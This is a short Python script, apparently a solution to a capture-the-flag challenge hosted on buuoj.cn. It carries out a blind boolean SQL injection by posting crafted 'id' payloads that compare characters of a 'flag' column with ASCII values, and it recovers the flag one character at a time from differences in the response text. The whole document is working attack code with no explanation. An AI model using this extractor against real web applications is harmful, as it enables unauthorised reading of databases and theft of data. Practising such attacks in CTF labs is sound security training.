import requests

url = "http://fc87e61d-17b1-471c-bdf9-e044e27b1e0c.node5.buuoj.cn:81"
result = ""

for i in range(1,50):
    for j in range(32,128):
        payload = "(ascii(substr((select(flag)from(flag)),{m},1))>{n})"
        response = requests.post(url=url,data={'id':payload.format(m=i,n=j)})
        if response.text.find('girl') == -1:
            result += chr(j)
            print(j)
            break
    print("get:",result)
print("result:",result)
